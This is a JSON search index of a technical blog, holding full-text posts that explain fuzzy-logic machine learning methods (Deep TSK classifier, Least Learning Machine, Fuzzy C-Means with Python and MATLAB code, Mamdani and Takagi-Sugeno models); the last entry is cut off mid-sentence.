[
  
  {
    "title": "Deconstructing the Deep TSK Fuzzy Classifier with Stacked Generalization",
    "url": "/posts/dtsk/",
    "categories": "ML",
    "tags": "Fuzzy, AI, ML, DL, Math",
    "date": "2025-07-12 00:00:00 +0900",
    





    
    "snippet": "In the landscape of modern machine learning, a persistent challenge lies at the intersection of performance and transparency. Deep learning architectures have achieved state-of-the-art results acro...",
    "content": "In the landscape of modern machine learning, a persistent challenge lies at the intersection of performance and transparency. Deep learning architectures have achieved state-of-the-art results across numerous domains, yet their “black box” nature often makes them unsuitable for high-stakes applications where interpretability is paramount. Conversely, traditional rule-based models, such as fuzzy systems, offer clear, human-readable logic but may not reach the same level of predictive accuracy.The Deep Takagi-Sugeno-Kang Fuzzy Classifier (D-TSK-FC) represents an ambitious attempt to resolve this dichotomy. It is engineered from the ground up to be a “white box” deep model—one that provides both enhanced classification performance and a guarantee of clear interpretability. The model achieves this by creating a novel synergy between the logical structure of TSK fuzzy systems, the error-correcting power of stacked generalization, and the computational efficiency of the Least Learning Machine (LLM).Base UnitThe most fundamental component of the model is a specialized zero-order TSK fuzzy classifier. This choice is deliberate, prioritizing interpretability at the most granular level.First Interpretability GuaranteeTo ensure the premise (the “IF” part) of the rules are linguistically clear, the model adopts a fixed fuzzy partition strategy.  It employs five Gaussian membership functions (GMFs) for every input feature.  The centers of these GMFs are permanently fixed at [0, 0.25, 0.5, 0.75, 1].  They are assigned the explicit linguistic labels: “very low, low, medium, high, very high”.This design ensures that the definition of a concept like “low” is consistent across all rules (always centered at 0.25), which avoids the semantic ambiguity that can arise from learned or irregularly shaped membership functions.Second Interpretability GuaranteeTo reduce rule complexity, the model designs rules that do not necessarily use all input features. This simplification is achieved through two randomly generated matrices.  Feature Selector Matrix ($\\Upsilon$): This is a $d \\times K$ matrix (where $d$ is the number of features and $K$ is the number of rules). Each element, $\\gamma_{jk}$, acts as a binary “switch,” determining if feature j is used in rule k. If $\\gamma_{jk}=0$, the feature is ignored in that specific rule.  Rule Combination Matrix ($RC$): This is a $d \\times 5 \\times K$ binary matrix. For the features selected by the $\\Upsilon$ matrix, the $RC$ matrix indicates which of the five fixed GMFs (e.g., “high” or “low”) is adopted for that feature in that rule.Through the combined action of these two matrices, a simple rule that only focuses on a subset of features is automatically generated, as exemplified in following equation.IF $x_1$ is low (with $\\gamma_{1k}=1$) AND $x_2$ is high (with  $\\gamma_{2k}=1$) AND $x_3$ is not involved (with $\\gamma_{3k}=0$) $\\cdot \\cdot \\cdot$ THEN a class output is $p_0^k$This design enhances readability and mitigates the risk of the “curse of dimensionality”. Furthermore, the structure of this unit is analogous to a single-layer feedforward network, which allows it to be trained efficiently using the Least Learning Machine (LLM) algorithm.The Stacked StructureWhile the base unit is interpretable, achieving high performance and accuracy requires stacking them to create a deep structure. The model’s deep architecture is built upon the stacked generalization principle, with the goal of correcting prediction errors layer by layer to enhance overall performance.The data flow mechanism is the most critical innovation of this model and the source of the third interpretability guarantee.      Layer 1: The model’s input is the original training dataset, $X_1 = X$. The first base-building unit trains on this data and produces a prediction result, $Y_1$.        The Core Mechanism: The information passed to the next layer is not the output $Y_1$ itself. Instead, it is the original training set plus a random shift derived from the previous layer’s prediction results.        The input for the next layer, $X_2$, is calculated as follows:  \\[X_2 = X + \\alpha Y_1 Z_1\\]Here, $X$ is the original training set, $Y_1$ is the prediction output from the first layer, $\\alpha$ is a small given constant, and $Z_1$ is a random projection matrix.Third Interpretability Guarantee  This unique data flow ensures that every base unit operates on the same input space as the original data.  This is a key distinction from traditional fuzzy systems, where subsequent layers operate on abstract, non-physical outputs from previous layers, making their rules difficult to interpret.  In the D-TSK-FC, because each layer’s input is just a slightly perturbed version of the original data $X$, any feature referenced in a rule—regardless of the layer—is always the original feature with its clear physical meaning.ExampleInitial  Training Data ($X$): We assume a training set with $N=3$ samples and $d=2$ features. The data has been normalized to a $[0, 1]$ range.\\[X = \\begin{pmatrix} x_1 \\\\ x_2 \\\\ x_3 \\end{pmatrix} = \\begin{pmatrix} 0.2 &amp; 0.8 \\\\ 0.9 &amp; 0.1 \\\\ 0.3 &amp; 0.6 \\end{pmatrix}\\]      Class Labels ($T$): This is a binary classification problem ($m=2$), with labels represented using one-hot encoding.          Sample 1 belongs to Class 2      Sample 2 belongs to Class 1      Sample 3 belongs to Class 2      \\[T = \\begin{pmatrix} t_1 \\\\ t_2 \\\\ t_3 \\end{pmatrix} = \\begin{pmatrix} 0 &amp; 1 \\\\ 1 &amp; 0 \\\\ 0 &amp; 1 \\end{pmatrix}\\]      Hyperparameters:          Perturbation Coefficient: $\\alpha = 0.03$.      Model Depth: $DP = 2$.      The CalculationLayer 1      Input: The input for the first base-building unit is the original training data, $X_1 = X$.        Training and Prediction:          The model is trained on the data pair $(X_1, T)$. This process involves randomly generating the rule structure, calculating the hidden layer matrix $H_1$, and using the LLM algorithm to analytically compute the output weights $\\beta_1$.      After training, the model predicts on the input $X_1$ to get the prediction output matrix $Y_1 = H_1\\beta_1$.      Assuming the resulting prediction matrix $Y_1$ (a $3 \\times 2$ matrix) is as follows:      \\[Y_1 = \\begin{pmatrix}0.3 &amp; 0.7 \\\\0.6 &amp; 0.4 \\\\0.4 &amp; 0.6\\end{pmatrix}\\]Interpretation: The model predicts sample 1 belongs to class 2 (0.7 probability), sample 2 to class 1 (0.6 probability), and sample 3 to class 2 (0.6 probability). The directionality is correct, but the confidence is not high.Input for Layer 2This is the core step of the stacked architecture. We will now generate the input for the second layer, $X_2$, based on the output of the first layer, $Y_1$.      The Core Formula:\\[X_2 = X + \\alpha Y_1 Z_1\\]        Generate Matrix ($Z_1$):          We need a random matrix $Z_1$. For the matrix multiplication to be valid, its dimensions must be $m \\times d$ (i.e., $2 \\times 2$).      Let’s assume the randomly generated $Z_1$ is as follows (with elements between 0 and 1):      \\[Z_1 = \\begin{pmatrix}0.8 &amp; 0.2 \\\\0.3 &amp; 0.9\\end{pmatrix}\\]  Calculate $\\alpha Y_1 Z_1$:\\[\\begin{pmatrix}   0.3 &amp; 0.7 \\\\   0.6 &amp; 0.4 \\\\   0.4 &amp; 0.6   \\end{pmatrix}   \\times   \\begin{pmatrix}   0.8 &amp; 0.2 \\\\   0.3 &amp; 0.9\\end{pmatrix}=  \\begin{pmatrix}  0.45 &amp; 0.69 \\\\  0.60 &amp; 0.48 \\\\  0.50 &amp; 0.62  \\end{pmatrix}\\]\\[\\text{Perturbation} = 0.03 \\times \\begin{pmatrix}       0.45 &amp; 0.69 \\\\       0.60 &amp; 0.48 \\\\       0.50 &amp; 0.62     \\end{pmatrix}     =       \\begin{pmatrix}       0.0135 &amp; 0.0207 \\\\       0.0180 &amp; 0.0144 \\\\       0.0150 &amp; 0.0186       \\end{pmatrix}\\]  Final Input for Layer 2 ($X_2$):\\[X_2 = X + \\text{Perturbation}      =       \\begin{pmatrix}       0.2135 &amp; 0.8207 \\\\       0.9180 &amp; 0.1144 \\\\       0.3150 &amp; 0.6186       \\end{pmatrix}\\]Layer 2      Input: The second base-building unit now receives the newly computed, slightly perturbed dataset $X_2$ as its input.        Training and Prediction:          The model now trains on the new data pair $(X_2, T)$. Note that the target labels $T$ do not change.      The task for this second layer is to learn a mapping from the perturbed data $X_2$ to the original correct labels $T$. The samples in $X_2$ may have been “pushed” into positions that are easier to classify correctly, as the perturbation contained information from the first layer’s predictions.      After training, it will produce an output $Y_2$. Since we set the depth $DP=2$, this $Y_2$ is the final prediction result of the entire D-TSK-FC model.      Deep Learning AlgorithmThe algorithm’s core principle is layer-by-layer construction, where it iteratively builds and trains each base-building unit until the desired model depth is achieved.The algorithm takes the training data ($X$), labels ($T$), and the model depth ($DP$) as input. The process unfolds within a main loop that executes $DP$ times, once for each layer.For any given layer dp within the loop, the key steps are as follows:      Rule Premise Initialization: The “IF” part of all fuzzy rules for the current layer is defined. This is done by randomly generating the Feature Selector Matrix ($\\Upsilon_{dp}$) and the Rule Combination Matrix ($RC_{dp}$), which injects the necessary structural randomness for the layer.        Hidden Layer Calculation: The objective of this phase is to compute the firing strength of every rule for every training sample, forming the hidden layer output matrix, $H_{dp}$.          The process begins by calculating the basic membership grades of each feature for the five fixed Gaussian functions.      Next, it computes the per-feature activation value, $v_{jl}$.      \\[v_{jl}(x_j^i) = \\begin{cases} 1 - \\prod_{k=1}^{5} (1 - RC_{dp}(j, k, l)u(k, x_{ij})) &amp; \\text{if } \\gamma_{jl} = 1 \\\\ 1 &amp; \\text{if } \\gamma_{jl} = 0 \\end{cases}\\]If a feature is ignored ($\\gamma_{jl} = 0$), its contribution to the final product is a neutral 1. If the feature is used ($\\gamma_{jl} = 1$), its activation is calculated. The $1 - \\prod(1 - …)$ structure is a fuzzy logic operator known as the “algebraic sum,” which acts like an “OR” gate. It allows the rule to be activated if the feature belongs to any of the GMFs selected by the $RC$ matrix for that rule.Finally, the overall firing strength for a rule, $w_{il}$, is the product of all its per-feature activations ($v_{jl}$). These values for all samples and rules form the matrix $H_{dp}$.      LLM-based Learning: This is the critical learning step for the layer. The consequent parameters ($\\beta_{dp}$) are solved for analytically using the scalable version of the Least Learning Machine formula:\\[\\beta_{dp} = \\left(\\frac{1}{C}I + H_{dp}^T H_{dp}\\right)^{-1} H_{dp}^T T\\]    This non-iterative step, which involves inverting a smaller $K_{dp} \\times K_{dp}$ matrix, is key to the algorithm’s efficiency on large datasets.        The Stacking: Once the layer is trained, the algorithm prepares for the next. The layer’s predictions, $Y_{dp} = H_{dp}\\beta_{dp}$, are calculated. This output is then used to generate the perturbed input for the next layer, $X_{dp+1}$, using the core stacking formula: $X_{dp+1} = X + \\alpha Y_{dp} Z_{dp}$.  After the loop completes, the final prediction function of the entire model is the output of the last layer ($Y_{DP} = H_{DP}\\beta_{DP}$), and all the interpretable fuzzy rules from each layer can be formally described.Time Complexity and Prediction      Time Complexity: Due to the scalable LLM implementation, the algorithm’s time complexity is approximately linear with respect to the number of training samples, $N$ (when $N \\gg K$). This makes the D-TSK-FC a viable choice for large-scale data problems.        The Prediction Process: The process mirrors the training flow: z is passed sequentially through the layers. At each layer dp, the model calculates a prediction $y_{dp}$, which is then used to update the sample’s representation for the next layer using the same stacking formula: $z_{dp+1} = z + \\alpha y_{dp} Z_{dp}$. The final output from the last layer, DP, is the model’s definitive prediction for the sample z.  "
  },
  
  {
    "title": "The Mechanics of the Least Learning Machine",
    "url": "/posts/llm/",
    "categories": "ML",
    "tags": "AI, ML, Math",
    "date": "2025-07-10 00:00:00 +0900",
    





    
    "snippet": "In the domain of neural networks, the paradigm of iterative optimization, most famously embodied by backpropagation, has long been dominant. This approach, while powerful, often entails significant...",
    "content": "In the domain of neural networks, the paradigm of iterative optimization, most famously embodied by backpropagation, has long been dominant. This approach, while powerful, often entails significant computational cost and lengthy training times. The Least Learning Machine (LLM) presents a compelling alternative, abandoning iterative fine-tuning in favor of a non-iterative, analytical approach to learning.The Single-Layer Feedforward NetworkLLM is designed as a fast learning algorithm for Single-Layer Feedforward Networks (SFFNs). The structure of an SFFN consists of three layers:  An Input Layer that accepts the $d$-dimensional input vector $x_i$.  A Hidden Layer with $\\tilde{N}$ nodes, each applying a non-linear activation function $g(x, \\theta_j)$ to the input. The vector $\\theta_j$ represents the internal parameters (e.g., weights and biases) of the $j$-th hidden node.  An Output Layer that produces the final prediction by linearly combining the outputs of the hidden nodes with a set of weights, $\\beta$.The central principle of LLM is to decouple the learning process. The hidden layer is treated as a fixed feature projector, while learning is confined exclusively to the output layer.Core IdeaUnlike traditional algorithms that train all network parameters, LLM operates on a two-stage principle:      Randomized Hidden Layer: Once the number of hidden nodes $\\tilde{N}$ and the type of activation function $g$ are chosen, LLM randomly assigns the parameters $\\theta_j$ for all hidden nodes. Crucially, these parameters are then fixed and do not undergo any training or optimization. This layer functions as a static, non-linear projector that maps the input data from its original $d$-dimensional space into a new $\\tilde{N}$-dimensional feature space. The output of this layer for a set of $N$ input samples forms the hidden layer output matrix, $H$, of size $N \\times \\tilde{N}$.        Analytical Output Layer: With the hidden layer fixed, the network’s learning problem is reduced to finding the optimal output weight matrix $\\beta$ that linearly maps the hidden layer outputs $H$ to the target labels $T$. This becomes a standard linear modeling problem, which can be solved analytically.  LLM formulates the task of finding $\\beta$ as a ridge regression problem, which minimizes both the prediction error and the norm of the weights to prevent overfitting.\\[\\min \\left( \\frac{1}{2}\\beta^{2}+C\\sum_{i=1}^{N}\\xi_{i}^{2} \\right)\\]subject to the constraint:\\[H_i \\beta^T = t_i + \\xi_i, \\quad \\text{for } i=1, 2, \\dots, N\\]where $H_i$ is the hidden layer output for sample $x_i$, $t_i$ is its target label, and $\\xi_i$ represents the prediction error.For the derivation of the solution, it is often clearer to write this in the standard matrix form of regularized least squares:\\[J(\\beta) = \\frac{1}{2} \\|H\\beta - T\\|^2_F + \\frac{\\lambda}{2} \\|\\beta\\|^2_F\\]Here, $\\lambda$ is the regularization parameter and the $|A|^2_F$ represents the square of the Frobenius norm of matrix A (in simple terms, it is the sum of the squares of all elements in the matrix). To find the minimum of this function, we must compute the gradient with respect to $\\beta$ and set the result to zero.      State the objective function:\\[J(\\beta) = \\frac{1}{2} \\|H\\beta - T\\|^2_F + \\frac{\\lambda}{2} \\|\\beta\\|^2_F\\]        Compute the gradient of $J(\\beta)$ with respect to $\\beta$:\\[\\frac{\\partial J}{\\partial \\beta} = H^T(H\\beta - T) + \\lambda\\beta\\]        Set the gradient to zero to find the minimum:\\[H^T(H\\beta - T) + \\lambda\\beta = 0\\]\\[H^T H\\beta - H^T T + \\lambda\\beta = 0\\]\\[H^T H\\beta + \\lambda\\beta = H^T T\\]    Factor out $\\beta$. To do this, the scalar $\\lambda$ must be converted to a matrix by multiplying by the identity matrix $I$:\\[(H^T H + \\lambda I)\\beta = H^T T\\]    Finally, pre-multiply both sides by the inverse of $(H^T H + \\lambda I)$ to isolate $\\beta$:\\[(H^T H + \\lambda I)^{-1} (H^T H + \\lambda I)\\beta = (H^T H + \\lambda I)^{-1} H^T T\\]    This simplifies to the final analytical solution:\\[\\beta = (H^T H + \\lambda I)^{-1} H^T T\\]    This formula allows the optimal output weights to be computed in a single, non-iterative step.  Equivalent FormulationThe computational efficiency of the solution depends on the size of the matrix being inverted. The derived formula involves inverting $(H^T H + \\lambda I)$, a matrix of size $K \\times K$, where $K$ is the number of hidden nodes.According to Woodbury matrix identity, there is an equivalent mathematical formulation for the solution, shown as equation:\\[\\beta = H^T (HH^T + \\lambda I)^{-1} T\\]This second form involves inverting $(HH^T + \\lambda I)$, a matrix of size $N \\times N$, where $N$ is the number of training samples.The choice between these two formulas is critical for scalability:  $\\beta = (H^T H + \\lambda I)^{-1} H^T T$ :  The computational complexity is dominated by the inversion of a $K \\times K$ matrix.  $\\beta = H^T (HH^T + \\lambda I)^{-1} T$ : The complexity is dominated by the inversion of an $N \\times N$ matrix.In typical large-data scenarios, the number of samples $N$ is much greater than the number of hidden nodes $K$ (i.e., $N \\gg K$). Therefore, using the first formula is vastly more efficient, making LLM a scalable algorithm suitable for large datasets.ApplicationsGiven its characteristics of high-speed training and mathematical simplicity, the Least Learning Machine (LLM) and its principles find value in several application domains.The most direct application is its use as the efficient learning engine for each “base-building unit” within a deep, stacked architecture. By embedding LLM into a stacked framework, the resulting model gains powerful non-linear capabilities while retaining remarkable training speed, making it suitable for complex tasks.Beyond its role as a component in deep models, LLM itself can function as a standalone, rapid classifier or regressor. It is well-suited for general supervised learning tasks where quick prototyping, model building, and validation are critical. Furthermore, LLM is particularly adept at handling classification problems involving large datasets."
  },
  
  {
    "title": "Fuzzy C-Means (FCM) Clustering & Subtractive Clustering Overview",
    "url": "/posts/fcm/",
    "categories": "AI",
    "tags": "Fuzzy, AI, ML, Math",
    "date": "2025-07-08 00:00:00 +0900",
    





    
    "snippet": "Introduction to FCMFuzzy C-Means (FCM) is a clustering technique that allows data points to belong to more than one cluster by introducing a membership matrix. It minimizes the following objective ...",
    "content": "Introduction to FCMFuzzy C-Means (FCM) is a clustering technique that allows data points to belong to more than one cluster by introducing a membership matrix. It minimizes the following objective function:\\[J_m = \\sum_{i=1}^N \\sum_{j=1}^C u_{ij}^m \\|x_i - c_j\\|^2\\]where:  $ N $: Number of data points  $ C $: Number of clusters  $ u_{ij} $: Degree of membership of $ x_i $ in cluster $ j $  $ c_j $: The centroid of cluster $ j $  $ m $: Fuzziness parameter (usually $ m = 2 $)FCM Algorithm Steps      Initialize the number of clusters $ C $, fuzziness parameter $ m $, and the membership matrix $ U $ randomly so that the sum of the memberships for each sample is 1.        Compute cluster centers using the membership matrix:\\[c_j = \\frac{\\sum_{i=1}^N u_{ij}^m x_i}{\\sum_{i=1}^N u_{ij}^m}\\]        Update the membership matrix:\\[u_{ij} = \\frac{1}{\\sum_{k=1}^C \\left( \\frac{\\|x_i - c_j\\|}{\\|x_i - c_k\\|} \\right)^{2/(m-1)}}\\]        Repeat steps 2 and 3 until the membership matrix stabilizes (changes are below a threshold).  Python ImplementationHere is a simple implementation using NumPy:import numpy as npdef initialize_U(n, c):    U = np.random.rand(n, c)    U = U / np.sum(U, axis=1, keepdims=True)    return Udef update_centers(X, U, m):    um = U ** m    centers = um.T @ X / np.sum(um, axis=0)[:, None]    return centersdef update_U(X, centers, m):    dist = np.linalg.norm(X[:, None, :] - centers[None, :, :], axis=2)    dist = np.fmax(dist, np.finfo(np.float64).eps)  # Avoid division by zero    exp = 2 / (m - 1)    denom = np.sum((dist[:, :, None] / dist[:, None, :]) ** exp, axis=2)    U = 1 / denom    return Udef fcm(X, c, m=2, max_iter=100, tol=1e-5):    n = X.shape[0]    U = initialize_U(n, c)    for i in range(max_iter):        centers = update_centers(X, U, m)        U_new = update_U(X, centers, m)        if np.linalg.norm(U - U_new) &lt; tol:            break        U = U_new    return centers, Uif __name__ == \"__main__\":    from sklearn.datasets import make_blobs    X, _ = make_blobs(n_samples=200, centers=3, n_features=2, random_state=42)    centers, U = fcm(X, c=3)    print(\"Cluster centers:\\n\", centers)For practical work, you can use existing libraries such as scikit-fuzzy:import skfuzzy as fuzzimport numpy as npX = np.random.rand(2, 200)cntr, u, u0, d, jm, p, fpc = fuzz.cluster.cmeans(    X, c=3, m=2, error=0.005, maxiter=1000)MATLAB ImplementationBelow is a basic MATLAB implementation:function [centers, U] = fcm(X, c, m, max_iter, tol)    if nargin &lt; 3, m = 2; end    if nargin &lt; 4, max_iter = 100; end    if nargin &lt; 5, tol = 1e-5; end    n = size(X, 1);    U = rand(n, c);    U = U ./ sum(U, 2);    for iter = 1:max_iter        um = U .^ m;        centers = (um' * X) ./ sum(um)';        dist = pdist2(X, centers);        dist(dist==0) = eps;        denom = sum((dist(:,:,ones(1,c)) ./ permute(dist(:,:,ones(1,c)),[1 3 2])).^(2/(m-1)), 3);        U_new = 1 ./ denom;        if norm(U_new - U, 'fro') &lt; tol            break;        end        U = U_new;    endend% X = rand(200,2);% [centers, U] = fcm(X, 3);Applications  Image Segmentation: Pixels are clustered based on intensity/color, useful in medical image analysis.  Market Segmentation: Customers can belong to multiple segments with different degrees.  Document Clustering: Texts can have partial membership in several topics.Subtractive ClusteringSubtractive Clustering is a fast, density-based clustering algorithm often used as a pre-processing step for fuzzy clustering methods, such as the Fuzzy C-Means (FCM). It is especially suitable when the number and initial locations of clusters are unknown.The main idea of subtractive clustering is to consider each data point as a potential cluster center, and then evaluate the “density” of data points around it. Points with high density are more likely to be cluster centers. The algorithm iteratively selects the highest-density point as a cluster center and then reduces (“subtracts”) the density of data points in its neighborhood, ensuring that subsequent cluster centers are not too close to previous ones.Subtractive Clustering Steps      Density CalculationFor each data point $ x_i $, compute its density measure $ D_i $ as:\\[D_i = \\sum_{j=1}^N \\exp\\left(-\\frac{\\|x_i - x_j\\|^2}{(r_a/2)^2}\\right)\\]          $ N $: Number of data points      $ r_a $: Neighborhood radius (user-defined, e.g. 0.5 times the data range)            Select First Cluster Center:Find the data point with the highest density $ D_{c_1} $ and designate it as the first cluster center.        SubtractionFor all data points, reduce their density by:\\[D_j = D_j - D_{c_1} \\exp\\left(-\\frac{\\|x_j - x_{c_1}\\|^2}{(r_b/2)^2}\\right)\\]          $ r_b &gt; r_a $: A radius (often 1.5 times $ r_a $) that defines neighborhood for density reduction.            Repeat:Choose the next point with the highest remaining density as a new cluster center, reduce densities, and repeat until the density of the next potential center falls below a threshold.        Result:The selected centers are the initial cluster centers, which can be used for further clustering (e.g., as FCM’s initial centers).  Limitations  Results depend on the choice of parameters $ r_a $, $ r_b $, and density threshold.  Not robust to highly variable density within the data.MATLAB ExampleMATLAB’s Fuzzy Logic Toolbox provides subclust for subtractive clustering:X = rand(200,2);ra = 0.5; % Radius[center, sig] = subclust(X, ra);scatter(X(:,1), X(:,2), 20, 'b'); hold on;scatter(center(:,1), center(:,2), 80, 'r', 'filled');"
  },
  
  {
    "title": "Mamdani Fuzzy Neural Network - Architecture & Learning Algorithm",
    "url": "/posts/mamdani/",
    "categories": "AI",
    "tags": "Fuzzy, AI, ML",
    "date": "2025-07-07 00:00:00 +0900",
    





    
    "snippet": "IntroductionThe integration of fuzzy logic and neural networks seeks to create hybrid intelligent systems that leverage the strengths of both paradigms: the human-like, interpretable reasoning of f...",
    "content": "IntroductionThe integration of fuzzy logic and neural networks seeks to create hybrid intelligent systems that leverage the strengths of both paradigms: the human-like, interpretable reasoning of fuzzy systems and the data-driven learning capabilities of neural networks.The Mamdani Fuzzy Inference SystemBefore detailing the network architecture, it is essential to review the conventional Mamdani FIS on which it is based. We will only discuss Multi-Input, Single-Output (MISO) Mamdani system, because the fuzzy rules for MIMO can be decomposed into multiple MISO. A typical MISO Mamdani system processes information through four key stages:      Fuzzification: Crisp input values, such as $x = [x_1, x_2, …, x_n]^T$, are converted into fuzzy sets by calculating their membership degrees in predefined $j$-th linguistic term (e.g., “Low”, “Medium”, “High”). The membership degree $\\mu_{A_i^j}(x_i)$ quantifies the extent to which input $x_i$ belongs to the fuzzy set $A_i^j$.        Fuzzy Rule Inference: The system evaluates a set of “IF-THEN” rules. For each rule $R_i$, an firing strength (or activation strength) $\\alpha_i$ is computed by applying a fuzzy AND operator (typically product or min) to the membership degrees of the rule’s antecedents.  \\[\\alpha_{i}=\\mu_{A_1^{i}}(x_{1}) \\cdot \\mu_{A_2^{i}}(x_{2}) \\cdot \\cdot \\cdot \\mu_{A_n^{i}}(x_{n}) \\quad \\text{(product operator)}\\]\\[\\alpha_{i}=\\mu_{A_1^{i}}(x_{1}) \\wedge \\mu_{A_2^{i}}(x_{2}) \\cdot \\cdot \\cdot \\mu_{A_n^{i}}(x_{n}) \\quad \\text{(min operator)}\\]  The activation strength $\\alpha_i$ is then used to determine the output fuzzy set for that rule. All individual rule outputs are aggregated into a single final fuzzy set $B$.\\[B = \\bigcup^m_{i=1} B_i\\]  Defuzzification: The final fuzzy output set $B$ is converted into a single crisp output value $y_0$. While the Center of Gravity (COG) method is common, a computationally simpler and widely used approximation is the weighted average method:\\[y_{0} = \\frac{\\sum_{i=1}^{m} y_{c_i} \\alpha_i}{\\sum_{i=1}^{m} \\alpha_i} = \\sum_{i=1}^{m} y_{c_i} \\overline{\\alpha_i}\\]Here, $y_{c_i}$ is the center of the output fuzzy set for the $i$-th rule, and $\\overline{\\alpha_i}$ is the normalized firing strength of that rule. This final formula is the blueprint for the network’s output calculation.Five-Layer ArchitectureThe Mamdani FIS can be functionally represented by a five-layer feedforward neural network. Each layer performs a distinct step of the fuzzy inference process.      Layer 1: Input Layer  This layer acts as a simple distributor.          Function: It receives the crisp input vector $x = [x_1, …, x_n]^T$ and passes it to the next layer.      Nodes: $n$ nodes, one for each input variable.      Output: $O_i^{(1)} = x_i$.            Layer 2: Fuzzification Layer  This layer calculates the membership degrees for each input.          Function: Each node represents a linguistic term (e.g., “Positive Small”) and computes the membership degree of an input variable to that term.      Nodes: A total of $N_2 = \\sum_{i=1}^{n}m_i$ nodes, where $m_i$ is the number of fuzzy sets for the $i$-th input.      Output: The output is the membership degree, often calculated using a Gaussian function:      \\[O_{ij}^{(2)} = \\mu_{A_i^j}(x_i) = \\exp\\left(-\\frac{(x_i - c_{ij})^2}{\\sigma_{ij}^2}\\right)\\]The parameters $c_{ij}$ (center) and $\\sigma_{ij}$ (width) of the membership function are learnable parameters of the network.      Layer 3: Rule Layer  Each node in this layer corresponds to a single fuzzy rule.          Function: To compute the firing strength $\\alpha_j$ of each fuzzy rule by combining the membership degrees from the previous layer. This is typically done using a product T-norm operator.      Nodes: $m$ nodes, where $m$ is the total number of fuzzy rules.      Output: $O_j^{(3)} = \\alpha_j = \\prod_{i} O_{i,j}^{(2)}$, where $O_{i,j}^{(2)}$ are the membership degrees forming the antecedent of the $j$-th rule.            Layer 4: Normalization Layer  This layer normalizes the activation strengths calculated in Layer 3.          Function: To compute the normalized activation strength $\\overline{\\alpha}_j$ for each rule.      Nodes: $m$ nodes, same as the rule layer[cite: 82].      Output:      \\[O_j^{(4)} = \\overline{\\alpha}_j = \\frac{\\alpha_j}{\\sum_{k=1}^{m}\\alpha_k} = \\frac{O_j^{(3)}}{\\sum_{k=1}^{m}O_k^{(3)}}\\]      Layer 5: Defuzzification Layer  This layer computes the final crisp output.          Function: To calculate the overall system output as the weighted sum of the normalized activation strengths.      Nodes: $r$ nodes, one for each output variable (for MISO, $r=1$).      Output:      \\[y_i = O_i^{(5)} = \\sum_{j=1}^{m} w_{ij} \\overline{\\alpha}_j = \\sum_{j=1}^{m} w_{ij} O_j^{(4)}\\]The connection weights $w_{ij}$ are the final set of learnable parameters. Physically, each weight $w_{ij}$ corresponds to the center of the consequent fuzzy set ($y_{c_j}$) for the $j$-th rule in the original Mamdani model.Learning Algorithm via Error BackpropagationAs a feedforward network, this FNN can be trained using a supervised learning algorithm based on gradient descent, analogous to the standard backpropagation algorithm. The goal is to adjust the network’s parameters to minimize an error cost function.  Objective Function: The error is typically defined as the sum of squared differences between the network’s actual output $y_i$ and the desired target output $t_i$.\\[E = \\frac{1}{2}\\sum_{i=1}^{r}(t_i - y_i)^2\\]  Parameter Update: The learnable parameters—weights $w_{ij}$, centers $c_{ij}$, and widths $\\sigma_{ij}$—are updated iteratively using the gradient descent method. The general update rule is:\\[\\text{parameter}(k+1) = \\text{parameter}(k) - \\beta \\frac{\\partial E}{\\partial \\text{parameter}}\\]where $\\beta &gt; 0$ is the learning rate.  Gradient Calculation: The core of the algorithm is computing the partial derivatives of the error $E$ with respect to each parameter. This is achieved by propagating an error signal $\\delta^{(q)}$ backwards from the output layer (layer $q=5$) to the hidden layers.For weights $w_{ij}$ (Layer 5): The error signal at the output layer is $\\delta_i^{(5)} = t_i - y_i$. The gradient is then:\\[\\frac{\\partial E}{\\partial w_{ij}} = \\frac{\\partial E}{\\partial f_i^{(5)}} \\frac{\\partial f_i^{(5)}}{\\partial w_{ij}} = -(t_i - y_i)\\overline{\\alpha}_j\\]where $f_i^{(5)}$ is the net input to the $i$-th node in layer 5.For parameters $c_{ij}$ and $\\sigma_{ij}$ (Layer 2): The error signal $\\delta_i^{(5)}$ is propagated backward through Layer 4 and Layer 3 to obtain the error signal at Layer 2, $\\delta_{ij}^{(2)}$. Once $\\delta_{ij}^{(2)}$ is known, the gradients for the membership function parameters can be computed using the chain rule:\\[\\frac{\\partial E}{\\partial c_{ij}} = \\frac{\\partial E}{\\partial f_{ij}^{(2)}} \\frac{\\partial f_{ij}^{(2)}}{\\partial c_{ij}} = -\\delta_{ij}^{(2)} \\frac{2(x_i - c_{ij})}{\\sigma_{ij}^2}\\]\\[\\frac{\\partial E}{\\partial \\sigma_{ij}} = \\frac{\\partial E}{\\partial f_{ij}^{(2)}} \\frac{\\partial f_{ij}^{(2)}}{\\partial \\sigma_{ij}} = -\\delta_{ij}^{(2)} \\frac{2(x_i - c_{ij})^2}{\\sigma_{ij}^3}\\]where $f_{ij}^{(2)}$ is the net input to the corresponding node in Layer 2.By applying these update rules iteratively with a set of training data, the network learns to approximate the desired input-output mapping. The resulting system is both a local approximation network, similar to an RBF network, and an interpretable model whose structure and parameters have clear physical meanings derived from fuzzy logic."
  },
  
  {
    "title": "A Comprehensive Guide to the Takagi-Sugeno (T-S) Fuzzy Inference Model",
    "url": "/posts/ts-fuzzy/",
    "categories": "AI",
    "tags": "Fuzzy, AI, ML",
    "date": "2025-07-06 00:00:00 +0900",
    





    
    "snippet": "IntroductionThe Takagi-Sugeno (T-S) fuzzy inference model, first proposed by Japanese scholars Takagi and Sugeno in 1985, is a powerful and widely-used method for modeling and controlling complex n...",
    "content": "IntroductionThe Takagi-Sugeno (T-S) fuzzy inference model, first proposed by Japanese scholars Takagi and Sugeno in 1985, is a powerful and widely-used method for modeling and controlling complex nonlinear systems. Unlike traditional modeling techniques that often struggle with nonlinearity, the T-S model approximates a complex global nonlinear system by breaking it down into a collection of simpler, local linear models. These local models are then intelligently combined using fuzzy logic rules to provide a comprehensive and accurate system description.The core idea behind the T-S model is “divide and conquer.” It identifies different operating regions of a system and creates a simple linear input-output relationship for each region. A fuzzy inference mechanism then determines the degree to which each local model contributes to the final output, resulting in a smooth and continuous representation of the system’s behavior.StructureIn order to better understanding what Takagi-Sugeno inference is, before we go into the details, let’s first understand its structure.A typical T-S fuzzy inference system is composed of the following modules:      Input Variables: The crisp (non-fuzzy) inputs to the system.        Rule Base: A T-S fuzzy rule takes the form: IF $x$ is $A$ THEN $y = f(x)$ Where:                  $x$ is the input variable.                    A is a fuzzy set (e.g., “Low,” “Medium,” “High”).                    y = f(x) is a linear or constant function representing the local output for that rule. This is a key difference from other fuzzy models like Mamdani, where the output is also a fuzzy set.                  Inference Engine: This component calculates the “firing strength” ($\\omega$) for each rule based on the current system inputs.        Normalization: In this modeule, the firing strengths of the rules are normalized.        Local Linear Models: Each rule’s consequence part ($y = f(x)$) represents a distinct linear model that is 